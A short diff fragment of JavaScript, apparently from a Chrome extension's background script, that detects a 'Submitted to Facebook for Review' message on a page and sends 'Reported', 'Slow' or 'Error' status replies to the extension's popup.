+		} else if (pageContent.includes('Submitted to Facebook for Review')) {
+			console.log("success 1- Submitted to Facebook For Review");
+			success = 1;
+		} else {
+			success = 0;
+		}
+		if (success === 1) {
+			console.log("reported");
+			success = 0;
+			sendResponse({ farewell: "Reported" });
+		} else if (success === 2) {
+			console.log("Slow Internet");
+			success = 0;
+			sendResponse({ farewell: "Slow" });
+		} else {
+			console.log("error");
+			sendResponse({ farewell: "Error" });
+		}
+	} else {
+		console.log("unknown request type");
+		sendResponse({ farewell: "Confused!!!" });
+	}
+
+	return true;
+
+} // function end
+
+
+chrome.runtime.onMessage.addListener(fromPopup);
+
+
